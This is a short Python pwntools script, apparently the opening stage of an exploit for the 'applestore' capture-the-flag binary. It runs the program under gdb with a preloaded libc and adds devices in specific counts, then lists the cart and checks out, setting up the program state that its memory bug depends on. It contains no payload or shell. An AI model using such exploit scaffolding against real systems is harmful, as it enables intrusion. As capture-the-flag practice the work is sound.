from pwn import *


class Prompts:
    CHOICE = '> '
    DEV_NUM = 'Device Number> '


class Choices:
    ADD = '2'
    LIST_CART = '4'
    CHECKOUT = '5'
    OK = 'y'


applestore = ELF('applestore')
libc = ELF('libc_32.so.6')

p = gdb.debug(
    applestore.path,
    '''
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def add_devices():
    devices = {3: 3,  2: 11, 1: 12}
    print('[*] Adding the devices.')
    for dev_index, add_count in devices.items():
        for _ in range(add_count):
            p.sendafter(Prompts.CHOICE, Choices.ADD)
            p.sendafter(Prompts.DEV_NUM, str(dev_index))


def list_cart():
    print('[*] The shopping cart.')
    p.sendafter(Prompts.CHOICE, Choices.LIST_CART)
    p.sendafter(Prompts.CHOICE, Choices.OK)
    print(p.recvuntil(Prompts.CHOICE, drop=True).decode())
    p.unrecv(Prompts.CHOICE)


def checkout():
    p.sendafter(Prompts.CHOICE, Choices.CHECKOUT)
    p.sendafter(Prompts.CHOICE, Choices.OK)


def main():
    add_devices()
    list_cart()
    checkout()


if __name__ == "__main__":
    main()
